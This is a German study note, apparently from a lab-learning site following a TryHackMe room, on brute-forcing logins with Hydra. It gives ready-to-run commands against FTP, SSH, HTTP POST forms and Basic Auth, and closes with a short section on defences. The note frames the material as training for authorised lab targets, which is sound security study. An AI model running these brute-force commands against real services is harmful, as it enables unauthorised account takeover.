---
title: "Login-Brute-Forcing mit Hydra"
description: "Wie Hydra Anmeldungen gegen verschiedene Dienste testet – FTP, SSH und HTTP-Formulare – als Lernnotiz für autorisierte Lab-Umgebungen."
date: 2026-10-01
source: "TryHackMe – Hydra / Authentication"
tags: [brute-force, hydra, web]
draft: true
---

> Ausschließlich gegen eigene oder ausdrücklich freigegebene Ziele. Automatisiertes Durchprobieren von
> Passwörtern gegen fremde Logins ist ohne Erlaubnis strafbar.

Hydra probiert Benutzer-/Passwort-Kombinationen gegen einen Login-Dienst durch. Grundmuster:
`-l` ein Benutzer (oder `-L` Liste), `-P` eine Passwortliste, dann Ziel und Dienst.

## FTP
```bash
hydra -l user -P passlist.txt ftp://ziel-ip
```

## SSH
```bash
hydra -l <user> -P <wortliste> ziel-ip -t 4 ssh
```
`-t 4` begrenzt die parallelen Versuche – bei SSH sinnvoll, sonst brechen Verbindungen ab.

## HTTP-Formular (POST)
```bash
hydra -l <user> -P <wortliste> ziel-ip http-post-form \
  "/:username=^USER^&password=^PASS^:F=incorrect" -V
```
Die drei durch `:` getrennten Teile sind: der Pfad, die abgeschickten Felder (mit den Platzhaltern
`^USER^`/`^PASS^`) und die **Fehler-Kennung** – hier der Text `incorrect`, an dem Hydra einen
fehlgeschlagenen Versuch erkennt.

## HTTP Basic Auth (GET)
```bash
hydra -l bob -P /usr/share/wordlists/rockyou.txt -f ziel-ip http-get /protected/
```
`-f` stoppt, sobald ein gültiges Login gefunden wurde.

## In eigenen Worten
Der schwierigste Teil bei Formularen ist nicht der Angriff selbst, sondern die richtige Fehler-Kennung.
Dafür schickt man einmal ein falsches Passwort ab und schaut, mit welchem Text die Seite antwortet.

## Verteidigungssicht
Rate-Limiting, Account-Lockouts nach mehreren Fehlversuchen, MFA und das Erkennen vieler
Fehlanmeldungen im Log machen solche Angriffe unpraktikabel.
